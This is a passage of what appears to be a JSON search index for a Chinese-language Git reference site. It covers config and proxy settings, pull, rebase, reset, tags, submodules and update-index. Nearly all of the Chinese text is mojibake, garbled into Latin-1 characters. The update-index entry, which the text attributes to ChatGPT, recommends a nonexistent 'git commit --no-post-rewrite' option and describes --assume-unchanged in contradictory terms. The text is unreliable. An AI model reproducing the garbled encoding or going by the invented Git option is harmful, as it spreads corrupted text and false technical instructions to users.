æŸ¥çœ‹å…¨å±€çº§çš„config: git config â€“global -l æŸ¥çœ‹ç³»ç»Ÿçº§çš„config: git config â€“system -l ç¼–è¾‘å…¨å±€çº§çš„config( â€“edit, -e): git config â€“global -e é…ç½®å…¨å±€ä»£ç†(å¦‚ä¸‹æ˜¯clashå·¥å…·çš„é»˜è®¤ç«¯å£): git config --global http.proxy 'http://127.0.0.1:7890' ä»…é…ç½®æŸä¸€ä¸ªåœ°å€çš„ä»£ç†, å¦‚github: git config --global http.https://github.com.proxy http://127.0.0.1:7890 æ³¨è§£ Git çš„ http ä»£ç†é…ç½®é¡¹åªæœ‰ http.proxy ï¼Œå¹¶ä¸æ”¯æŒ https.proxy ï¼Œè¿™ç§å†™æ³•æ˜¯ä¸å­˜åœ¨/æ— ç”¨çš„ã€‚ å‚è€ƒ https://git-scm.com/search/results?search=http.proxy socketå½¢å¼: git config --global http.proxy socks5://127.0.0.1:7890 git config --global http.https://github.com.proxy socks5://127.0.0.1:7890 æ³¨è§£ æ²¡æœ‰httpsé€‰é¡¹, å¦‚æœè¦è®¾ç½®, httpåé¢çš„åœ°å€è·Ÿhttpsåœ°å€å³å¯","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-config.html","loc":"/yq-doc-source-docs-version-control-git-Command-config.html"},{"title":"fetch","text":"ä»è¿œç¨‹æ‹‰å–åˆ°æœ¬åœ°ç‰ˆæœ¬åº“, ä¸è¦†ç›–æœ¬åœ°å·¥ä½œåŒº","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-fetch.html","loc":"/yq-doc-source-docs-version-control-git-Command-fetch.html"},{"title":"pull","text":"ä»è¿œç¨‹æ‹‰å–å¹¶æ›´æ–°æœ¬åœ°, ç›¸å½“äº: git fetch && git merge æ³¨è§£ è®°å¾—Windowsä¸‹å®‰è£…gitçš„æ—¶å€™ä¼šè®©é€‰æ‹©pullæ—¶æ˜¯é€‰æ‹©mergeè¿˜æ˜¯rebase, é»˜è®¤æ˜¯merge. è‹¥åç»­éœ€è¦ä»¥rebaseçš„å½¢å¼pull, å¯ä»¥: git pull --rebase æˆ–è€…(ç­‰ä»·çš„): git fetch && git rebase å¦‚æ‹‰å–master: # æ‹‰å– git fetch origin master # åˆå¹¶ git merge FETCH_HEAD # ç›¸å½“äº # git pull origin master:master # git pull origin master","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-pull.html","loc":"/yq-doc-source-docs-version-control-git-Command-pull.html"},{"title":"push","text":"æ¨é€æœ¬åœ°ç‰ˆæœ¬åº“åˆ°è¿œç¨‹","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-pushh.html","loc":"/yq-doc-source-docs-version-control-git-Command-pushh.html"},{"title":"rebase","text":"å˜åŸº ç›®å‰æ¥çœ‹å˜åŸºæœ‰ä¸¤ä¸ªä½œç”¨, ä¸€æ˜¯åˆå¹¶å¤šæ¬¡commit: git rebse -i HEAD~$n äºŒæ˜¯æ”¹å˜å½“å‰åˆ†æ”¯åŸºäºæŸä¸ªåˆ†ä¹‹çš„åŸºç¡€ç‰ˆæœ¬(ä¸ä¸€å®šæ˜¯master,çœ‹æ˜¯ä»å“ªä¸ªåˆ†æ”¯æ–°å»ºåˆ†æ”¯) git checkout master && git pull git checkout test git rebase master å˜åŸºå­˜åœ¨é—®é¢˜éœ€è¦å›æ»š git reflog # ä¼šæ˜¾ç¤ºæ‰€æœ‰èŠ‚ç‚¹ æ¯”å¦‚ HEAD@{0} # é€‰æ‹©ä¸Šé¢æœ‰çš„èŠ‚ç‚¹ å¦‚ HEAD{3}, å›é€€åˆ°æ­¤èŠ‚ç‚¹æ‰€æŒ‡å‘çš„commit, ä¹Ÿå¯ä»¥ç”¨ commit_id git reset --hard HEAD@ { 3 }","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-rebase.html","loc":"/yq-doc-source-docs-version-control-git-Command-rebase.html"},{"title":"release","text":"git æœ¬èº«æ²¡æœ‰ release çš„æ¦‚å¿µ, release æ˜¯ github è¿™ç±»æ‰˜ç®¡å¹³å°æ‰æœ‰çš„, æ˜¯åŸºäº tag æ¥å‘å¸ƒäºŒè¿›åˆ¶æ–‡ä»¶(æ¯”å¦‚å½“å‰tagæ‰“åŒ…å¥½çš„exeæ‰§è¡Œæ–‡ä»¶)","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-release.html","loc":"/yq-doc-source-docs-version-control-git-Command-release.html"},{"title":"reset","text":"å›é€€åˆ°æŸä¸€ä¸ªç‰ˆæœ¬ resetç›´æ¥å›é€€, ä¸¢å¤±æŒ‡å®šç‰ˆæœ¬åçš„æ‰€æœ‰ä¿®æ”¹ï¼ˆç›´æ¥ä¿®æ”¹HEADæŒ‡å‘ï¼‰ # å…ˆæŸ¥æ‰¾éœ€è¦å›é€€çš„ç‰ˆæœ¬å·, ç„¶åæŒ‡å®šç‰ˆæœ¬å·resetå³å¯ git log git reset --hard $version_num git push -f å‚æ•°é€‰é¡¹ --hard - ç§»åŠ¨æœ¬åœ°åº“HEADæŒ‡é’ˆ - é‡ç½®æš‚å­˜åŒº - é‡ç½®å·¥ä½œåŒº --mixed - ç§»åŠ¨æœ¬åœ°åº“HEADæŒ‡é’ˆ - é‡ç½®æš‚å­˜åŒº --soft - ä»…ä»…ç§»åŠ¨æœ¬åœ°åº“HEADæŒ‡é’ˆ æ³¨è§£ ps: Jbç³»åˆ—ç¼–è¾‘å™¨, å¦‚ Pycharm Idea å³é”® git ä¸‹æœ‰ä¸ª rollback æŒ‰é’®, å®é™…è§¦å‘çš„å°±æ˜¯: git reset --hard HEAD&#94; è¡¨ç¤ºå›é€€è‡³æœ€è¿‘ä¸€ä¸ªç‰ˆæœ¬. resetè¿˜åŸå•æ–‡ä»¶ å¦‚æœä½¿ç”¨git reset å‘½ä»¤å›é€€æŸä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆå®ƒåªèƒ½æš‚å­˜åŒºè¢«æ¢å¤ã€‚ æ‰€ä»¥è¿˜éœ€è¦æ‰‹åŠ¨restoreä¸€ä¸‹æ–‡ä»¶: git reset HEAD -- example.py git restore example.py å¦‚æœè¿‡ç¨‹ä¸­æŸ¥çœ‹çŠ¶æ€ä¼šå‘ç° reset çš„æ—¶å€™å°±å·²ç»è¢«è‡ªåŠ¨addäº†, æ‰€ä»¥restoreåä¸éœ€è¦æ‰‹åŠ¨addç›¸å…³éƒ¨åˆ†.","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-reset.html","loc":"/yq-doc-source-docs-version-control-git-Command-reset.html"},{"title":"restore","text":"æ’¤é”€å·¥ä½œåŒºä¿®æ”¹ # git restore æŒ‡ä»¤ä½¿å¾—åœ¨å·¥ä½œç©ºé—´ä½†æ˜¯ä¸åœ¨æš‚å­˜åŒºçš„æ–‡ä»¶æ’¤é”€æ›´æ”¹(å†…å®¹æ¢å¤åˆ°æ²¡ä¿®æ”¹ä¹‹å‰çš„çŠ¶æ€) # git restore --staged çš„ä½œç”¨æ˜¯å°†æš‚å­˜åŒºçš„æ–‡ä»¶ä»æš‚å­˜åŒºæ’¤å‡º, ä½†ä¸ä¼šæ›´æ”¹æ–‡ä»¶çš„å†…å®¹ git restore $dir_or_file","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-restore.html","loc":"/yq-doc-source-docs-version-control-git-Command-restore.html"},{"title":"revert","text":"ååšæŸä¸€ä¸ªç‰ˆæœ¬. æ¯”å¦‚æœ‰ç‰ˆæœ¬1, 2, 3, ç‰ˆæœ¬2å­˜åœ¨é—®é¢˜, éœ€è¦æ’¤é”€ç‰ˆæœ¬2, ä¿ç•™ç‰ˆæœ¬3, é‚£ä¹ˆä¼šé‡æ–°ç”Ÿæˆä¸€ä¸ªç¬¦åˆè¦æ±‚çš„ç‰ˆæœ¬4. é€‚ç”¨äºæƒ³æ’¤é”€ä¹‹å‰çš„æŸä¸€ç‰ˆæœ¬, ä½†æ˜¯åˆæƒ³ä¿ç•™è¯¥ç‰ˆæœ¬åé¢çš„ç‰ˆæœ¬. # å…ˆæ‰¾éœ€è¦revertååšçš„ç‰ˆæœ¬ git log git revert -n $version_num git commit -m 'xxx' git push","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-revert.html","loc":"/yq-doc-source-docs-version-control-git-Command-revert.html"},{"title":"show","text":"æ˜¾ç¤ºå„ç§ç±»å‹çš„å¯¹è±¡ï¼Œ å¯¹äºæäº¤ï¼Œå®ƒæ˜¾ç¤ºæ—¥å¿—æ¶ˆæ¯å’Œæ–‡æœ¬å·®å¼‚ï¼Œ å¯¹äºæ ‡ç­¾ï¼Œå®ƒæ˜¾ç¤ºæ ‡ç­¾æ¶ˆæ¯å’Œå¼•ç”¨å¯¹è±¡ è¯­æ³•: git show [options] <object>â€¦â€‹ æè¿°: æ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªå¯¹è±¡ï¼ˆäºŒè¿›åˆ¶å¤§å‹å¯¹è±¡ã€æ ‘ã€æ ‡ç­¾å’Œæäº¤ï¼‰ã€‚ å¯¹äºæäº¤ï¼Œå®ƒæ˜¾ç¤ºæ—¥å¿—æ¶ˆæ¯å’Œæ–‡æœ¬å·®å¼‚ã€‚å®ƒè¿˜ä»¥ç‰¹æ®Šæ ¼å¼æ˜¾ç¤ºåˆå¹¶æäº¤git diff-tree --ccã€‚ å¯¹äºæ ‡ç­¾ï¼Œå®ƒæ˜¾ç¤ºæ ‡ç­¾æ¶ˆæ¯å’Œå¼•ç”¨çš„å¯¹è±¡ã€‚ å¯¹äºæ ‘ï¼Œå®ƒæ˜¾ç¤ºåç§°ï¼ˆç›¸å½“äºgit ls-treeä»…é™äº - åç§°ï¼‰ã€‚ å¯¹äºæ™®é€šçš„äºŒè¿›åˆ¶å¤§å‹å¯¹è±¡ï¼Œå®ƒæ˜¾ç¤ºç®€å•çš„å†…å®¹ã€‚ è¯¥å‘½ä»¤ä½¿ç”¨é€‚ç”¨äºè¯¥git diff-treeå‘½ä»¤çš„é€‰é¡¹æ¥æ§åˆ¶æäº¤å¼•å…¥çš„æ›´æ”¹çš„æ˜¾ç¤ºæ–¹å¼ã€‚ OPTIONS <object>â€¦â€‹ è¦æ˜¾ç¤ºçš„å¯¹è±¡çš„åç§°ï¼ˆé»˜è®¤ä¸º HEAD ï¼‰ --pretty[=<format>], --format=<format> ä»¥ç»™å®šæ ¼å¼æ‰“å°æäº¤æ—¥å¿—çš„å†…å®¹ï¼Œå…¶ä¸­< format> å¯ä»¥æ˜¯ oneline ç”¨ä¾‹ æŸ¥çœ‹tagè¯¦æƒ…: git show releaseV2 æ˜¾ç¤ºæŸæ¬¡æäº¤æŸä¸ªæ–‡ä»¶çš„è¯¦æƒ…: git show commitId fileName","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-show.html","loc":"/yq-doc-source-docs-version-control-git-Command-show.html"},{"title":"status","text":"æŸ¥çœ‹å·¥ä½œå»æ–‡ä»¶å˜åŠ¨æƒ…å†µ. ä½¿ç”¨å‚æ•° -s æŸ¥çœ‹ç®€å•ä»‹ç»","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-status.html","loc":"/yq-doc-source-docs-version-control-git-Command-status.html"},{"title":"submodule","text":"æ”¯æŒçš„é€‰é¡¹ init ä¸å¸¦å‚æ•°é»˜è®¤ä» .gitmodules å‘ç°å­æ¨¡å—, å¹¶æ³¨å†Œå­æ¨¡å—(è¦æ±‚æ­¤ç›®å½•ä¸åœ¨ç‰ˆæœ¬åº“)åˆ°ç´¢å¼•ä¿¡æ¯ (å³æ³¨å†Œåˆ° .git/config ) sync ä»å­æ¨¡å—çš„è¿œç¨‹url(ä¸Šæ¸¸)åŒæ­¥ä¿¡æ¯ (å­æ¨¡å—ä» .git/config è·å–). ä¹Ÿå°±æ˜¯åªæœ‰ init å¥½çš„æ‰å¯ä»¥ä½¿ç”¨ deinit è§£æ³¨å†Œä¸€/å¤šä¸ªå­æ¨¡å—. ä¼šå°†å…¶ç›¸å…³ä¿¡æ¯ä» .git/config ä¸‹ç§»é™¤(åŒ…æ‹¬work tree), ä½†æ˜¯ä¿ç•™ .gitmodules é‡Œçš„ä¿¡æ¯. æ•ˆæœç­‰ä»·äº git submodule update git submodule foreach git submodule sync æœ‰æ—¶å€™ä½ ä»åˆ«äººä»“åº“æ‹‰ä¸œè¥¿, åˆä¸æƒ³è¦é‡Œé¢å­æ¨¡å—, å°±å¯ä»¥ç”¨è¿™ä¸ªæŒ‡ä»¤. è¯­æ³• git submodule deinit [ -f | --force ] ( --all | [ -- ] <path> ) -f, --force å³ä½¿å·²ç»æ‹‰å–äº†å­æ¨¡å—, ä¸”ä¿®æ”¹äº†å­æ¨¡å—å†…å®¹, ä¹Ÿè¿›è¡Œåˆ é™¤æ“ä½œ å¦‚æœæƒ³å®Œå…¨åˆ é™¤å­æ¨¡å—, åŒ…æ‹¬ç‰ˆæœ¬åº“, å¯ä»¥æ­é… git rm ä½¿ç”¨ ä½¿ç”¨ git submodule add $remote_git_addr $local_dir æ·»åŠ å­æ¨¡å—åˆ°æœ¬åœ°çš„ç›®å½• git submodule update --remote $local_dir æ›´æ–°æŸä¸€ä¸ªå­æ¨¡å— git submodule foreach 'git pull origin master' æ›´æ–°å¤šä¸ªå­æ¨¡å— git submodule update --init --recursive åˆå§‹åŒ–é€’å½’ä¸‹è½½å­æ¨¡å—ï¼ˆä½¿ç”¨å·²æœ‰çš„æœ€æ–°commit idï¼Œå»ºè®®ä½¿ç”¨ï¼‰ git submodule update --remote --recursive é€’å½’æ›´æ–°æ‰€æœ‰å­æ¨¡å—ï¼ˆå¼ºåˆ¶ç”¨masterè¦†ç›–å­æ¨¡å—ï¼Œé™¤éä½¿ç”¨masterï¼Œå¦åˆ™ä½¿ç”¨ä¸Šä¸€ä¸ªå¥½ç‚¹ï¼‰ æ³¨æ„ï¼š æ—¶åˆ»å…³æ³¨å­æ¨¡å—çš„ç‰ˆæœ¬å·ï¼Œ æäº¤æ—¶å®¹æ˜“è¯¯ä¿®æ”¹æ­¤éƒ¨åˆ† è¡¥å……ï¼š submoduleåªèƒ½æ˜¯å…ˆåœ¨å­æ¨¡å—æäº¤ä»£ç ï¼Œç„¶åå»ä¸»å·¥ç¨‹æäº¤commit_id æ³¨æ„ï¼š é»˜è®¤ä½¿ç”¨ git submoduleæ£€å‡ºçš„æ˜¯ä¸€ä¸ªä¸´æ—¶çš„åˆ†æ”¯ï¼ˆémasterä»¥åŠå…¶ä»–ï¼‰ï¼Œæ‰€ä»¥è¦åœ¨ä¸»å·¥ç¨‹æ‰€åœ¨ç›®å½•è¿›å»ä¿®æ”¹ï¼Œéœ€è¦å…ˆåˆ‡æ¢submoduleåˆ°æ­£å¸¸åˆ†æ”¯æ‰å¯ï¼› åŒæ—¶ï¼Œå¯¹äºä¸»å·¥ç¨‹è€Œè¨€ï¼Œå”¯ä¸€è¯†åˆ«å­æ¨¡å—æ–¹å¼ä¸ºcommit idï¼Œè€Œébranchï¼Œæ‰€ä»¥éœ€è¦åˆ‡æ¢å­æ¨¡å—çš„åˆ†æ”¯æ—¶ï¼Œç›´æ¥åœ¨å­æ¨¡å—åˆ‡æ¢åï¼Œå†è¿”å›ä¸»å·¥ç¨‹æäº¤æ–°çš„å­æ¨¡å—commit idå³å¯ åˆ é™¤ åˆ é™¤å­æ¨¡å—ç›®å½•åŠæºç : rm -rf å­æ¨¡å—ç›®å½• åˆ é™¤é¡¹ç›®ç›®å½•ä¸‹.gitmodulesæ–‡ä»¶ä¸­å­æ¨¡å—ç›¸å…³æ¡ç›®: vim .gitmodules åˆ é™¤é…ç½®é¡¹ä¸­å­æ¨¡å—ç›¸å…³æ¡ç›®: vim .git/config åˆ é™¤æ¨¡å—ä¸‹çš„å­æ¨¡å—ç›®å½•ï¼Œæ¯ä¸ªå­æ¨¡å—å¯¹åº”ä¸€ä¸ªç›®å½•ï¼Œæ³¨æ„åªåˆ é™¤å¯¹åº”çš„å­æ¨¡å—ç›®å½•å³å¯ rm .git/modules/å­æ¨¡å—å è¿˜åŸæš‚å­˜åŒºçš„æ·»åŠ (å¦‚æœæ˜¯åˆšæ·»åŠ çš„submodule): git restore --staged .","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-submodule.html","loc":"/yq-doc-source-docs-version-control-git-Command-submodule.html"},{"title":"tag","text":"è¯­æ³•æŒ‡ä»¤ åˆ›å»ºtag: git tag -a tag-name(å¦‚v0.0.1) # å¢åŠ ä¸€ä¸ªtag, ä¸‹é¢çš„ä¾‹å­, éƒ½ä»¥ v0.0.1 ä½œä¸ºtagå git tag -a v0.0.1 cc16905 # å¯¹æŸä¸€æäº¤çš„ä¿¡æ¯æ‰“tagæ ‡ç­¾ï¼Œæœ«å°¾æ˜¯ä¸€ä¸ªcommit id git tag -a v0.0.1 -m \"version 0.0.1, tag info\" # åˆ›å»ºtagå¸¦æœ‰è¯´æ˜ä¿¡æ¯ git tag v0.0.1 # åˆ›å»ºè½»é‡çš„æ ‡ç­¾tag(å¿«é€Ÿåˆ›å»ºtag) git tag v0.0.2 be7a3e4 # ç»™æäº¤çš„ä¿¡æ¯æ‰“tagï¼Œcommit idä¸º be7a3e4 æŸ¥çœ‹tag: git tag # æŸ¥çœ‹æ‰€æœ‰æ ‡ç­¾ git show tag-name # æŸ¥çœ‹æŒ‡å®šçš„tag git show -s tag-name # æŸ¥çœ‹æŒ‡å®šçš„tagçš„hashå€¼ æ¨é€åˆ°è¿œç¨‹: git push origin v0.0.1 # æ¨é€æŸä¸€tagåˆ°è¿œç¨‹ä»“åº“ï¼š git push origin --tags # ä¸€æ¬¡æ¨é€å¤šä¸ªæ ‡ç­¾ git push --tags åˆ é™¤æ ‡ç­¾: git tag -d v0.0.1 æ ¹æ®æ ‡ç­¾æ£€å‡º: git checkout v0.0.1 æ ¹æ®æ ‡ç­¾å›é€€: # å…ˆæŸ¥çœ‹è¦å›é€€çš„æ ‡ç­¾ä¿¡æ¯ git show v0.0.1 # ä¸»å¹²åˆ†æ”¯å›é€€åˆ°æŸä¸ªç‰ˆæœ¬(v0.0.1å¯¹åº”çš„å‰7ä¸ºhash) git reset --hard cc16905 tagä¸commitåŒºåˆ« Git tagæ˜¯ä¸€ç³»åˆ—commitçš„ä¸­çš„ä¸€ä¸ªç‚¹, åªèƒ½æŸ¥çœ‹, ä¸èƒ½ç§»åŠ¨ã€‚branchæ˜¯ä¸€ç³»åˆ—ä¸²è”çš„commitçš„çº¿ã€‚ tagæ˜¯é™æ€çš„, branchæ˜¯åŠ¨æ€çš„, è¦å‘å‰èµ°ã€‚ tagåˆ†ç±» è½»é‡çº§: ä»…ä¸ºæŸä¸ª commit å¼•ç”¨ å¸¦é™„æ³¨: å­˜å‚¨åœ¨ä»“åº“ä¸­çš„ç‹¬ç«‹å¯¹è±¡, åŒ…å«æœ‰è‡ªèº«æ ¡éªŒå’Œä¿¡æ¯ç­‰ç­‰ (å¸¸ç”¨) åˆ›å»ºtag git tag -a V0.1 -m 'release 0.1' tagé€‰é¡¹å‚æ•° -a annotated, ä¸€èˆ¬éƒ½æ˜¯ç‰ˆæœ¬å· -m å¤‡æ³¨ä¿¡æ¯ -d åˆ é™¤æŸä¸€ä¸ªtag -v éªŒè¯tag ç”¨ä¾‹: # åˆ›å»ºä¸€ä¸ª 0.0.0 çš„tag, è¿™é‡Œåªæ˜¯æµ‹è¯•, ä¸€èˆ¬å»ºè®® v0.0.0 ä½œä¸ºæ ‡ç­¾å, vè¡¨ç¤ºversion, 0.0.0 è¡¨ç¤ºè¯­ä¹‰åŒ–ç‰ˆæœ¬ git tag -a 0 .0.0 -m 'release 0.0.0, test some msg' # æŸ¥çœ‹æœ‰å“ªäº›tag git tag # 0.0.0 # æŸ¥çœ‹æŸä¸€ä¸ªtag git show 0 .0.0 # tag 0.0.0 # ... (å°±ä¸è´´å‡ºæ¥äº†) # æ¨é€ git push origin --tags # è‹¥éœ€è¦åˆ é™¤ git tag -d 0 .0.0 # æ¨ä¸€ä¸ªç©ºçš„ä¸Šå»è¦†ç›–æ‰, è¾¾åˆ°åˆ é™¤ç›®çš„ git push origin :refs/tags/0.0.0 # å…¶ä»–åˆ é™¤æ–¹å¼ # git push origin :0.0.0 # ä¹Ÿå¯ä»¥è¿™æ · # git push origin --delete tag 0.0.0 # è·å–æŒ‡å®štag git fetch origin tag 0 .0.0 æ³¨è§£ è¯­ä¹‰åŒ–ç‰ˆæœ¬è§„åˆ™ ç‰ˆæœ¬æ ¼å¼ï¼šä¸»ç‰ˆæœ¬å·.æ¬¡ç‰ˆæœ¬å·.ä¿®è®¢å·, ç‰ˆæœ¬å·é€’å¢è§„åˆ™å¦‚ä¸‹ï¼š ä¸»ç‰ˆæœ¬å·ï¼šå½“ä½ åšäº†ä¸å…¼å®¹çš„ API ä¿®æ”¹, æ¬¡ç‰ˆæœ¬å·ï¼šå½“ä½ åšäº†å‘ä¸‹å…¼å®¹çš„åŠŸèƒ½æ€§æ–°å¢, ä¿®è®¢å·ï¼šå½“ä½ åšäº†å‘ä¸‹å…¼å®¹çš„é—®é¢˜ä¿®æ­£ã€‚ ä¸€èˆ¬éƒ½æ˜¯ä» 0.1.0 å¼€å§‹","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-tag.html","loc":"/yq-doc-source-docs-version-control-git-Command-tag.html"},{"title":"update-index","text":"ç”¨äºæ›´æ–°Gitç´¢å¼•æˆ–æš‚å­˜åŒºçš„å†…å®¹ã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§ç”¨æ³•: --assume-unchanged <file> å°†æŒ‡å®šæ–‡ä»¶æ ‡è®°ä¸º\"å·²å¿½ç•¥\"ï¼ˆassume unchangedï¼‰ï¼Œå³åœ¨ä»¥åçš„æäº¤ä¸­å¿½ç•¥è¯¥æ–‡ä»¶çš„ä¿®æ”¹ ( å‘Šè¯‰Gitä¸è¦é‡å¤æ‰«æè¯¥æ–‡ä»¶çš„çŠ¶æ€ï¼Œå› æ­¤å¦‚æœæ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼ŒGitä»ç„¶ä¼šæäº¤è¿™äº›ä¿®æ”¹ ): git update-index --assume-unchanged <file> --no-assume-unchanged <file> å–æ¶ˆæŒ‡å®šæ–‡ä»¶çš„\"å·²å¿½ç•¥\"æ ‡è®°ï¼Œè¿™æ ·Gitå°†ä¼šè·Ÿè¸ªæ‰€åšçš„ä¿®æ”¹: git update-index --no-assume-unchanged <file> --skip-worktree <file> ç±»ä¼¼äº\"å·²å¿½ç•¥\", å®Œå…¨å¿½ç•¥æ–‡ä»¶çš„ä¿®æ”¹ï¼Œå³ä½¿æ–‡ä»¶è¢«ä¿®æ”¹ï¼Œä¹Ÿä¸ä¼šæäº¤åˆ°ç‰ˆæœ¬åº“ git update-index --skip-worktree <file> --no-skip-worktree <file> å–æ¶ˆæŒ‡å®šæ–‡ä»¶çš„\"å·²å¿½ç•¥\"æ ‡è®°ï¼Œè¿™æ ·Gitå°†ä¼šè·Ÿè¸ªæ‰€åšçš„ä¿®æ”¹: git update-index --no-skip-worktree <file> --add <file> å°†æŒ‡å®šæ–‡ä»¶æ·»åŠ åˆ°Gitç´¢å¼•æˆ–æš‚å­˜åŒºä¸­(ä»…èƒ½æ·»åŠ è‡³æš‚å­˜åŒº): git update-index --add <file> --remove <file> ä»Gitç´¢å¼•æˆ–æš‚å­˜åŒºä¸­åˆ é™¤æŒ‡å®šæ–‡ä»¶: git update-index --remove <file> --chmod=(+|-)x <file> å°†æŒ‡å®šæ–‡ä»¶æ ‡è®°ä¸ºå¯æ‰§è¡Œ: git update-index --chmod=+x <file> é€šè¿‡ä½¿ç”¨`git update-index`å‘½ä»¤ï¼Œå¯ä»¥çµæ´»åœ°ç®¡ç†Gitç´¢å¼•æˆ–æš‚å­˜åŒºä¸­çš„æ–‡ä»¶ï¼Œä»¥æ»¡è¶³ç‰¹å®šçš„éœ€æ±‚ã€‚ --skip-worktreeå’Œ--assume-unchangedåŒºåˆ« ä»¥ä¸‹æ¥æºäº ChatGpt --skip-worktreeçš„ä½¿ç”¨ç¤ºä¾‹ å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåŒ…å«æ•æ„Ÿä¿¡æ¯çš„æ–‡ä»¶config.ymlï¼Œæˆ‘ä»¬å°†å®ƒæ·»åŠ åˆ°ç‰ˆæœ¬åº“ä¸­å¹¶æäº¤äº†ä¸€ä¸ªåˆå§‹ç‰ˆæœ¬ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°ä¿®æ”¹äº†è¯¥æ–‡ä»¶ï¼Œä½†ä¸å¸Œæœ›è¿™äº›ä¿®æ”¹è¢«æäº¤åˆ°ç‰ˆæœ¬åº“ä¸­ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å°†config.ymlæ–‡ä»¶æ ‡è®°ä¸º\"å·²å¿½ç•¥\"ï¼Œä»¥ä¾¿Gitåœ¨ä»¥åçš„æäº¤ä¸­å¿½ç•¥å®ƒçš„ä¿®æ”¹ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤: git update-index --skip-worktree config.yml ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ä¿®æ”¹config.ymlæ–‡ä»¶ï¼Œä¸å¿…æ‹…å¿ƒè¿™äº›ä¿®æ”¹ä¼šè¢«æäº¤åˆ°ç‰ˆæœ¬åº“ä¸­ã€‚å¦‚æœæˆ‘ä»¬éœ€è¦å–æ¶ˆè¿™ä¸ªæ ‡è®°ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤: git update-index --no-skip-worktree config.yml éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªæ ‡è®°åªä¼šåœ¨æœ¬åœ°èµ·ä½œç”¨ï¼Œä¸ä¼šä»ç‰ˆæœ¬åº“ä¸­åˆ é™¤æ–‡ä»¶ï¼Œä¹Ÿä¸ä¼šé˜»æ­¢å…¶ä»–äººåœ¨å…¶æœ¬åœ°è¿›è¡Œä¿®æ”¹ã€‚ --assume-unchangedçš„ä½¿ç”¨ç¤ºä¾‹ å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªè¾ƒå¤§çš„æ—¥å¿—æ–‡ä»¶log.txtï¼Œæ¯æ¬¡æ‰§è¡Œ`git status`æˆ–å…¶ä»–Gitå‘½ä»¤æ—¶éƒ½éœ€è¦æ‰«æè¿™ä¸ªæ–‡ä»¶ï¼Œå¯¼è‡´é€Ÿåº¦å˜æ…¢ã€‚ å¦‚æœæˆ‘ä»¬ç¡®å®šå¯¹è¿™ä¸ªæ–‡ä»¶çš„æ›´æ”¹ä¸ä¼šå¯¹ç‰ˆæœ¬åº“äº§ç”Ÿå½±å“ï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒæ ‡è®°ä¸º\"å·²å¿½ç•¥\"ï¼ŒåŠ å¿«Gitå‘½ä»¤çš„æ‰§è¡Œé€Ÿåº¦ã€‚ é¦–å…ˆï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å°†log.txtæ–‡ä»¶æ ‡è®°ä¸º\"å·²å¿½ç•¥\": git update-index --assume-unchanged log.txt ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ä¿®æ”¹log.txtæ–‡ä»¶ï¼Œä½†è¿™äº›ä¿®æ”¹ä¸ä¼šå‡ºç°åœ¨`git status`å‘½ä»¤çš„è¾“å‡ºä¸­ã€‚ å¦‚æœæˆ‘ä»¬éœ€è¦å–æ¶ˆè¿™ä¸ªæ ‡è®°ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤: git update-index --no-assume-unchanged log.txt éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ git update-index --assume-unchanged åªæ˜¯å‘Šè¯‰Gitä¸è¦é‡å¤æ‰«æè¯¥æ–‡ä»¶çš„çŠ¶æ€ï¼Œ å› æ­¤å¦‚æœæ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼ŒGitä»ç„¶ä¼šæäº¤è¿™äº›ä¿®æ”¹ã€‚å¦‚æœéœ€è¦å®Œå…¨å¿½ç•¥æ–‡ä»¶çš„ä¿®æ”¹ï¼Œ åº”è¯¥ä½¿ç”¨`git update-index --skip-worktree`å‘½ä»¤ã€‚ å¦‚æœ ä¸æƒ³å–æ¶ˆæ ‡è®°æäº¤ : éœ€è¦æ‰‹åŠ¨å°†ä¿®æ”¹çš„å†…å®¹æ·»åŠ åˆ°Gitæš‚å­˜åŒºä¸­: git add <file> åœ¨æ‰§è¡Œgit commitå‘½ä»¤æ—¶ï¼Œéœ€è¦ä½¿ç”¨--no-post-rewriteé€‰é¡¹æ¥é˜²æ­¢Gité‡å†™æäº¤å†å²: git commit -m \"commit message\" --no-post-rewrite å¦‚æœå…¶ä»–äººåœ¨å…¶æœ¬åœ°ä¿®æ”¹äº†è¯¥æ–‡ä»¶ï¼Œå¹¶æäº¤äº†æ›´æ”¹ï¼Œæ‚¨åœ¨æ‹‰å–æ›´æ–°æ—¶å¯èƒ½ä¼šé‡åˆ°å†²çªã€‚ å› 